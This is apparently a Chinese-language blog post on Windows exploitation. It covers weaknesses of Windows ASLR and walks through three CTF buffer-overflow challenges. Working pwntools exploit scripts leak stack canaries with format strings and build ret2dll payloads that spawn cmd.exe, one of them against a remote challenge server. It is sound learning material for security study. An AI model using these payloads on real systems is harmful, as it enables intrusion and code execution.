<p>我个人有点先入为主，因为刚开始做的 <code>Linux</code> 下漏洞利用，在见识了该系统上 <code>ASLR+PIE</code> 开满后，程序每次运行时所有的地址都会被随机化，让我认为地址随机化本该如此。而在 <code>CTF</code> 中的题目又都是存在漏洞的，需要做的是用漏洞来突破地址随机化。但实际上的程序（无论是 <code>windows</code> 上还是 <code>Linux</code> 上）并不是一定存在漏洞，当概率较低出现了缓冲区溢出漏洞时，地址随机化保护起到的是缓解作用（并不是为了完全防御攻击）。假设攻击者要攻击远程系统的一个服务，已知存在缓冲区溢出漏洞，可 <code>ASLR</code> 的开启让程序基地址不会处于一个让攻击者已知的固定地址。攻击者无法在第一时间 <code>ROP</code> 进一步扩大利用（包括泄露地址，执行危险函数等），即使程序基地址只会在系统启动时随机一次，但依然能在一定程度上缓解攻击。</p>
<p>不管怎么说，<code>windows</code> 都要比 <code>Linux</code> 上的地址随机化保护更脆弱（可能是为了运行效率考虑？），结合这篇 <a target="_blank" rel="noopener" href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/">文章</a> 的内容，总结下 <code>windows</code> 中 <code>ASLR</code> 的缺点：</p>
<ol>
<li><p>基于启动时的随机化：模块基地址只在系统启动时随机化，重新运行程序，地址并不会改变。结合内存泄露或者暴力破解可以突破。</p>
</li>
<li><p>可执行文件不支持 <code>ASLR</code>：当可执行文件或 <code>DLL</code> 不是使用 <code>ASLR</code> 支持生成时，不支持 ASLR。尽管 <code>Windows 8</code> 和 <code>Windows 10</code> 试图克服此限制（例如强制执行 <code>ASLR</code>），但仍有例外情况（不过暂时还没遇见到）。</p>
</li>
<li><p>无法捕获攻击：<code>ASLR</code> 无法提供有关攻击的任何信息，它只能尽量让攻击失效。</p>
</li>
<li><p><code>ASLR</code>  不会发出任何被攻击的警告：除了看到进程崩溃之外，用户不知道自己此刻有没有受到攻击</p>
</li>
</ol>
<h2 id="x32dbg简单操作"><a href="#x32dbg简单操作" class="headerlink" title="x32dbg简单操作"></a>x32dbg简单操作</h2><p>先下断点后调试</p>
<p><code>F2</code> 下断点</p>
<p><code>F9</code> 是跳转到最近的断点处</p>
<p><code>F8</code> 是步过（跳过函数）</p>
<p><code>F7</code> 是步入（进入函数）</p>
<p><code>ctrl+F9</code> 运行至当前函数的结尾</p>
<h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="root-me-PE32-Stack-buffer-overflow-avance"><a href="#root-me-PE32-Stack-buffer-overflow-avance" class="headerlink" title="root-me PE32 - Stack buffer overflow avancé"></a>root-me PE32 - Stack buffer overflow avancé</h2><p><a target="_blank" rel="noopener" href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%B3%BB%E7%BB%9F/PE32-Advanced-stack-buffer-overflow?lang=zh">题目链接</a> </p>
<p>这里给了 <code>ssh</code> 的地址和端口，下面还有用户名和密码。用 <code>ssh</code> 可以登录靶机，然后用 <code>scp</code> 将文件给拷贝出来（不过我没成功，我用 <code>Xterminal</code> 连接上靶机后，用软件的下载功能拿到了附件）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324112219021.png" alt="image-20240324112219021"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在主函数中判断了是否传入了命令行参数，对于命令行参数的要求是一个文件名， <code>fopen</code> 会返回其文件指针和文件名一起作为参数传入给 <code>manage_file</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324113735479.png" alt="image-20240324113735479"></p>
<p>在 <code>manage_file</code> 函数中，<code>fseek(Stream,0,2)</code> 会将文件指针移动到文件末尾，然后 <code>ftell</code> 函数会计算当前文件指针距离文件起始位置的偏移是多少，以此来得到文件的大小。然后又用遍历的方式检索了文件的字符数量，单词数量，行数。漏洞出现在 <code>open</code> 打开文件后，用 <code>read</code> 函数直接将文件里的数据读到了 <code>8192</code> 字节大小的数组中，因为文件的大小不确定，因此我们可以设计一个足够大的文件，让程序造成溢出。观察函数的结尾，发现没有开启 <code>GS</code> 保护。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324114031506.png" alt="image-20240324114031506"></p>
<p>下面分别是文件的字节数正常和大量字节数的两种情况，可以看到造成溢出的情况下让程序造成了崩溃（右），并且原本的文件指针也被覆盖成了 <code>0x61616161</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324173126201.png" alt="image-20240324173126201"></p>
<h3 id="解决调试问题"><a href="#解决调试问题" class="headerlink" title="解决调试问题"></a>解决调试问题</h3><p>在漏洞利用之前应该先解决调试的问题，因为程序没有输入，只有最开始传入了一个命令行参数。没有输入能够阻塞进程，导致进程拿到命令行参数会立刻运行结束，没时间附加到进程上调试。我采取的方法是（感觉可能 <code>x32dbg</code> 提供了更好的方法？但我不了解）<code>patch</code> 掉针对 <code>argc</code> 的判断，并且将 <code>fopen</code> 和 <code>manage_file</code> 函数的参数都改成固定的字符串 <code>1.txt</code> （这个字符串需要写到 <code>.rdata</code> 段）</p>
<p>首先在 <code>Hex View-1</code> 界面将 <code>1.txt</code> 字符串在 <code>0x404FA0</code> 处编辑出来</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152404283.png" alt="image-20240322152404283"></p>
<p>然后修改 <code>text</code> 段传参的汇编代码，在这之前先确定 <code>mov eax,0x404fa0</code> 的机器码</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152426641.png" alt="image-20240322152426641" style="zoom: 50%;" />



<p>依然是在 <code>Hex View-1</code> 界面去编辑机器码（不知道为什么 <code>keypatch</code> 用不了）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152526621.png" alt="image-20240322152526621"></p>
<p>此时将汇编代码修改成了下面这样</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152413841.png" alt="image-20240322152413841" style="zoom:50%;" />



<p>解析成伪代码发现 <code>fopen</code> 和 <code>manage_file</code> 的参数都已经固定为了 <code>1.txt</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152328579.png" alt="image-20240322152328579"></p>
<p>最后将 <code>if(argc&lt;=1)</code> 修改成 <code>if(argc&lt;=0)</code> ，只需要把汇编代码 <code>cmp     [ebp+argc], 1</code> 改成 <code>cmp     [ebp+argc], 0</code> 就行 </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322160516896.png" alt="image-20240322160516896"></p>
<p>这样我使用 <code>x32dbg</code> 就可以直接从头调试该程序了，想看不同输入导致程序的状态，只需要调整 <code>1.txt</code> 文件的内容即可。解决了调试问题下面进行漏洞利用。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>溢出时会覆盖掉 <code>v11</code> ，该变量里装的是 <code>fopen</code> 打开 <code>1.txt</code> 的文件指针。如果将其改成了垃圾数据，那么还走不到 <code>manage_file</code> 返回，<code>fclose(v11)</code> 就会造成崩溃。 </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180212341.png" alt="image-20240324180212341" style="zoom:50%;" />



<p>多次运行 <code>ch73.exe</code> 程序，发现打印的文件指针是同一个，也就是说该地址是固定的（重启电脑的话就变了），因此在溢出的时候需要还原一下文件指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180449107.png" alt="image-20240324180449107"></p>
<p>用 <code>x32dbg</code> 调试的时候，点击符号这一栏，选择 <code>msvcrt.dll</code> 里面搜索 <code>system</code> 。可以拿到其地址为 <code>0x77013D30</code> （应该是因为没开 <code>ASLR</code> 导致 <code>dll</code> 基地址每次都是固定的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181108465.png" alt="image-20240324181108465"></p>
<p>然后字符串 <code>cmd.exe</code> 的话，在 <code>x32dbg</code> 中搜索可能会遇见 <code>cmd.exe</code> 字符串后面并不是 <code>\x00</code> 的情况。我是用 <code>IDA</code> 搜的，<code>cmd.exe</code> 在这个 <code>msvcrt.dll</code> 中的偏移是 <code>0x47A4</code> 。因为 <code>dll</code> 加载的基地址是 <code>0x76FD0000</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181745856.png" alt="image-20240324181745856"></p>
<p>在内存窗口查看 <code>0x76FD47A4</code> 的数据，发现此处确实为 <code>cmd.exe</code> 字符串</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181932374.png" alt="image-20240324181932374"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>简单计算偏移，能写出如下脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd_addr=<span class="number">0x76FD47A4</span></span><br><span class="line">system_addr=<span class="number">0x77013D30</span></span><br><span class="line">file_ptr=<span class="number">0x77084660</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2014</span>-<span class="number">0xc</span>)</span><br><span class="line">payload+=p32(file_ptr)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(cmd_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(payload))</span><br></pre></td></tr></table></figure>



<p>将 <code>payload</code> 写入文件存储，当漏洞程序加载 <code>1.txt</code> 中的 <code>payload</code> 并将其读入内存，就可以执行 <code>system(&quot;cmd.exe&quot;)</code> 从而拿到了 <code>shell</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324182254918.png" alt="image-20240324182254918"></p>
<h2 id="2024NKCTF-来签个到"><a href="#2024NKCTF-来签个到" class="headerlink" title="2024NKCTF_来签个到"></a>2024NKCTF_来签个到</h2><p>昨天刚做了第一个 <code>ret2dll</code> 的[例题](#root-me PE32 - Stack buffer overflow avancé)，今天比赛就又遇见 <code>windows pwn</code> 了。当时的例题打的本地，所以关于远程环境的一些问题就没有考虑到，通过这个比赛的题目又学到了一些知识😎</p>
<h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p>首先查看题目是 <code>32</code> 位的 <code>exe</code> 文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202626595.png" alt="image-20240323202626595"></p>
<p>用 <code>checksec</code> 看了一下保护，发现 <code>GS</code> （也就是 <code>linux</code> 下的 <code>canary</code>）没有开启（但实际上是开启了，这里没有检测出来）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202218137.png" alt="image-20240323202218137" style="zoom: 67%;" />



<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><code>OH</code> 函数中实现了主要逻辑，两次 <code>gets</code> 函数，第一次主要是来输入数据，配合着 <code>printf</code> 函数存在的格式化字符串漏洞实现任意地址泄露的目的，接着再一次 <code>gets</code> 函数进行栈溢出漏洞的利用。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203127182.png" alt="image-20240323203127182"></p>
<p>观察汇编代码很明显能看出来是有 <code>GS</code> 保护的，因此上面提到的格式化字符串漏洞还得泄露出 <code>canary</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203607041.png" alt="image-20240323203607041" style="zoom: 67%;" />



<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>作为刚接触 <code>windows pwn</code> 的初学者，我的做题思路是这样：</p>
<ol>
<li>把程序放到虚拟机里面后，用 <code>win_server</code> 把程序影响到某个端口上，然后在宿主机里面写脚本（用 <code>remote</code> 去和虚拟机里的程序交互），因为程序本身的输入就可以阻塞进程，方便用 <code>x32dbg</code> 直接附加到进程上调试。</li>
<li>刚开始只考虑先打通本地，所以还用不到题目给出的 <code>dll</code> 文件。对于本题而言，调试的时候关注三个点，首先是 <code>canary</code> 的位置，就是第一次输入大量的 <code>%p-%p-%p-%p</code> 字符串，我要能确认出哪个是 <code>canary</code> 并进行接收；其次是溢出的偏移量也要计算出来；最后在 <code>x32dbg</code> 的调试界面查看一下 <code>msvcrt.dll</code> 的基地址（因为目前做题很少，应该是只要没开 <code>ASLR</code> 的 <code>dll</code> 基地址都是固定的？），顺便确保多次运行程序， <code>msvcrt.dll</code> 的基地址是固定的。</li>
<li>有两次输入，在脚本里只编写一次 <code>sendline</code> 函数，这样就会让进程阻塞</li>
</ol>
<h3 id="调试-amp-amp-打通本地"><a href="#调试-amp-amp-打通本地" class="headerlink" title="调试&amp;&amp;打通本地"></a>调试&amp;&amp;打通本地</h3><p>我将断点下到了 <code>0x4014DF</code> 处，在给予第二次输入后程序就可以运行到此处（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210310637.png" alt="image-20240323210310637"></p>
<p>此时的代码是要判断 <code>canary</code> 是否被破坏，取了栈里的 <code>ebp-0xc</code> 的值做比较，那说明 <code>0x61FF0C</code> 中存放的就是 <code>canary</code> 。输入大量的 <code>%p</code> 就可以成功将 <code>canary</code> 泄露出来。至于溢出偏移量的计算是常规操作，这里不再提及。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210543053.png" alt="image-20240323210543053"></p>
<p>点击 <strong>符号</strong> 这一栏，可以看到 <code>msvcrt.dll</code> 的基地址是 <code>0x76860000</code> （多次运行发现一直固定），在右侧可以搜索 <code>system</code> 函数，可以看到地址是 <code>0x768A3D30</code> 。也就是说 <code>system</code> 函数在该 <code>dll</code> 里的偏移量为 <code>0x43D30</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323211605343.png" alt="image-20240323211605343"></p>
<p>但是我把该 <code>dll</code> 拖到了 <code>IDA</code> 中，查看 <code>system</code> 地址为 <code>0x10143D30</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323230837806.png" alt="image-20240323230837806"></p>
<p>然后发现 <code>text</code> 段的首地址为 <code>0x10101000</code> ，二者相减，得到 <code>system</code> 函数在 <code>dll</code> 中的偏移为 <code>0x42D30</code> 。和上面在 <code>x32dbg</code> 中求出的 <code>0x43D30</code> 偏移不同（目前原因未知，不过肯定要以 <code>x32dbg</code> 上的为准）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323231258275.png" alt="image-20240323231258275"></p>
<p>同理，在 <code>dll</code> 中找到字符串 <code>cmd.exe</code> 的地址（用基地址加上其偏移即可，因为 <code>dll</code> 中地址固定，所以也可以直接在 <code>x32dbg</code> 里去搜索其 <code>system</code> 和所需参数固定的地址），此时可以写出如下 <code>exp</code></p>
<p>整个的思路很常规，要提的两点分别是接收 <code>canary</code> 可以在前面发送几个字符 <code>a</code> ，然后用 <code>recvuntil</code> 函数读取 <code>a</code> 之后，再去接收 <code>canary</code> 会很准确（不知道为什么无法用 <code>%3$p</code> 这样的格式化字符来精准泄露数据）。另外就是 <code>sleep</code> 是为了提供一个足够的时间，让我来得及手动附加到进程上去调试。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.110.131&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">payload=<span class="string">&#x27;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaa%p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;NKCTF2024&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary==&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system_addr=<span class="number">0x768a3d30</span></span><br><span class="line">cmd_addr=<span class="number">0x768647a4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x64</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0x11223344</span>)+p32(cmd_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>此时已经拿到了本地的 <code>shell</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323233759018.png" alt="image-20240323233759018"></p>
<h3 id="攻击远程"><a href="#攻击远程" class="headerlink" title="攻击远程"></a>攻击远程</h3><p>接下来根据 <code>dll</code> 基地址调整 <code>exp</code> 从而攻击远程，经过测试我发现偏移 <code>4</code> 的位置疑似是 <code>msvcrt.dll</code> 中的地址，并且地址未随机。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234328781.png" alt="image-20240323234328781"></p>
<p>为什么会猜测远程环境中偏移 <code>4</code> 的位置就是 <code>msvcrt.dll</code> 中的地址呢？因为我在调试本地时，发现了这个位置（偏移 <code>4</code>）存放了一个 <code>msvcrt.dll</code> 中的地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234604692.png" alt="image-20240323234604692"></p>
<p>我不知道如何更换 <code>dll</code> ，我看网上有师傅把 <code>C:\windows\SysWoW64\</code> 目录下面的 <code>msvcrt.dll</code> 改个名字，然后将题目给的 <code>msvcrt.dll</code> 拷贝进去。我操作了之后，发现还是没有更换成功，于是重启系统，接着就开始疯狂报错，所有的可执行文件都打不开了。于是只能尝试其他思路。</p>
<p>我先是查看了本地偏移 <code>4</code> 的那个地址，其实际在 <code>dll</code> 中的偏移为 <code>0x7A19B</code> ，这里的位置是 <code>setvbuf+0x10B</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235442691.png" alt="image-20240323235442691" style="zoom:67%;" />



<p>因为上面是看的本地的地址，所以 <code>dll</code> 也是用系统本身的。接下来我又看了一下远程泄露的地址 <code>0x76D6BDFB</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235602941.png" alt="image-20240323235602941"></p>
<p>然后我查看了题目给的 <code>dll</code> ，我先定位到了 <code>setvbuf</code> 函数，也去找到 <code>setvbuf+0x10B</code> 的位置，发现地址是 <code>0x1017BDFB</code> 。此时意识到这个地址的最后几个字节和远程泄露的地址末尾几个字节一样。根据上面本地用 <code>IDA</code> 查看偏移的经验，这个 <code>setvbuf+0x10B</code> 的位置实际在 <code>dll</code> 里的偏移应该是 <code>0x7BDFB</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235844469.png" alt="image-20240323235844469"></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>上面的只能算猜测，但按照这样来猜，我确实可以得到远程环境 <code>dll</code> 的基地址，然后将 <code>system</code> 函数和 <code>cmd.exe</code> 字符串偏移换成题目给的 <code>dll</code> 里的值，可以写出 <code>exp</code> 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;123.60.25.223&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">payload=<span class="string">&#x27;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaa%p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;NKCTF2024&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary==&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">dll_base=<span class="number">0x76D6BDFB</span>-<span class="number">0x7BDFB</span></span><br><span class="line">system_addr=dll_base+<span class="number">0x44700</span></span><br><span class="line">cmd_addr=dll_base+<span class="number">0x048C8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x64</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0x11223344</span>)+p32(cmd_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后就直接梭哈拿下了…😍</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324001017015.png" alt="image-20240324001017015"></p>
<h2 id="强网杯2020-easyoverflow"><a href="#强网杯2020-easyoverflow" class="headerlink" title="强网杯2020_easyoverflow"></a>强网杯2020_easyoverflow</h2><p><a target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">题目下载链接</a></p>
<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0</span>i64);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0</span>i64);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0</span>i64);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;buffer:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_acrt_iob_func(0)</code> 会返回标准输入流 <code>stdin</code> 的指针，<code>setbuf</code> 会设置输入流为无缓冲模式。之后有三次循环，每次循环都可以溢出并且 <code>puts</code> 直接输出了 <code>DstBuf</code> ，可以将一些栈中数据给顺带打印出来。</p>
<p>开启了 <code>GS</code> 保护，下面是 <code>StackCookie</code> 在当前栈帧的生成以及函数返回前的检查代码。首先将 <code>__security_cookie</code> （位于 <code>.data</code> 段）赋值给 <code>rax</code> ，然后拿该值和 <code>rsp</code> 进行异或并写入 <code>rsp+138h+var_18</code> 的位置，这样可以确保每个栈帧中存放的 <code>StackCookie</code> 不一样，避免攻击者泄露了一次 <code>StackCookie</code> 后可以完全绕过 <code>GS</code>。在检查时会取出 <code>rsp+138h+var_18</code> 存放的 <code>StackCookie</code> 异或 <code>rsp</code> 和 <code>__security_cookie</code> 进行比较（在 <code>__security_check_cookie</code> 函数中完成） </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001000                 push    rbx</span><br><span class="line">.text:0000000140001002                 sub     rsp, 130h</span><br><span class="line">.text:0000000140001009                 mov     rax, cs:__security_cookie</span><br><span class="line">.text:0000000140001010                 xor     rax, rsp</span><br><span class="line">.text:0000000140001013                 mov     [rsp+138h+var_18], rax</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">.text:00000001400010B2                 mov     rcx, [rsp+138h+var_18]</span><br><span class="line">.text:00000001400010BA                 xor     rcx, rsp        ; StackCookie</span><br><span class="line">.text:00000001400010BD                 call    __security_check_cookie</span><br><span class="line">.text:00000001400010C2                 add     rsp, 130h</span><br><span class="line">.text:00000001400010C9                 pop     rbx</span><br><span class="line">.text:00000001400010CA                 retn</span><br></pre></td></tr></table></figure>



<p>将断点下到偏移 <code>0x140001094</code> 处，查看 <code>.data</code> 段上的 <code>__security_cookie</code> 与 <code>RSP</code> 异或得到的结果正好是栈里存放的 <code>StackCookie</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325102510607.png" alt="image-20240325102510607"></p>
<p>此时填充 <code>(0x118-0x18)</code> 个垃圾字符，正好到 <code>StackCookie</code> ，<code>puts</code> 函数就能把它给带出来（程序重新运行，<code>StackCookie</code> 已改变）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325110649724.png" alt="image-20240325110649724"></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>因为 <code>windows 64</code> 位下的传参方式不是用栈实现的，如果可以直接泄露出 <code>ucrtbase.dll</code> 基地址，拿到 <code>system</code> 函数和 <code>cmd.exe</code> 字符串地址就可以拿到 <code>shell</code>。在 <code>64</code> 位下，参数的传递是通过 <code>rcx\rdx\r8\r9</code> 寄存器实现的。为了控制参数就得去寻找 <code>gadget</code> 进行 <code>ROP</code> ，我首先想到能不能用上面带出来 <code>StackCookie</code> 的方式，把栈里的 <code>ucrtbase.dll</code> 中的指针给带出来，这样用该 <code>dll</code> 中的 <code>gadget</code> 和函数地址可以一次性完成 <code>system(&quot;cmd.exe&quot;)</code> 的执行。经过调试，发现栈中有 <code>stackoverflow.exe</code> <code>kernel32.dll</code> <code>ntdll.dll</code> 的指针，但唯独没有 <code>ucrtbase.dll</code> 的指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328111721770.png" alt="image-20240328111721770"></p>
<p>这就意味需要主动 <code>rop</code> 来泄露 <code>ucrtbase.dll</code> 中地址，在 <code>windows</code> 中的 <code>IAT</code> （<strong>导入地址数组</strong>  <strong>Import Address Table</strong>）类似于 <code>Linux</code> 中的 <code>GOT</code> 表，里面都存放了函数的真实地址。要泄露 <code>IAT</code> 中的数据需要拿到程序基地址，但搜索 <code>gadget</code> 却发现在 <code>stackoverflow.exe</code> 文件中没有 <code>pop rcx ; ret</code> 的 <code>gadget</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328125151982.png" alt="image-20240328125151982"></p>
<p>看 <strong>z1r0</strong> 和 <strong>Vergissmeinnicht</strong> 师傅的文章中都提到去 <code>ntdll.dll</code> 中寻找更多的 <code>gadget</code> ，我觉得他们提到的原因不是最关键的。我认为之所以用 <code>ntdll.dll</code> 中的 <code>gadget</code> 就单纯因为它存在于栈中，可以被顺带打印出来，并且其中存在 <code>pop rcx ; ret</code> 的 <code>gadget</code> 。而 <code>kernel32.dll</code> 中没有 <code>pop rcx ; ret</code> 所以不考虑泄露它的地址。</p>
<p>补充：我找不到这道题的远程环境，但我依然把他当做攻击远程来做。因为 [关于 Windows 下的 ASLR 机制](关于 Windows 下的 ASLR 机制) 中提到单纯打本地的话，这些模块地址都是固定的，压根不需要每次泄露（打远程其实也不需要每次泄露，只要泄露一次模块基地址就可以），不过确实是没有环境，就没有换题目给的 <code>dll</code> （好吧，其实是我现在还不知道怎么换😶‍🌫️）</p>
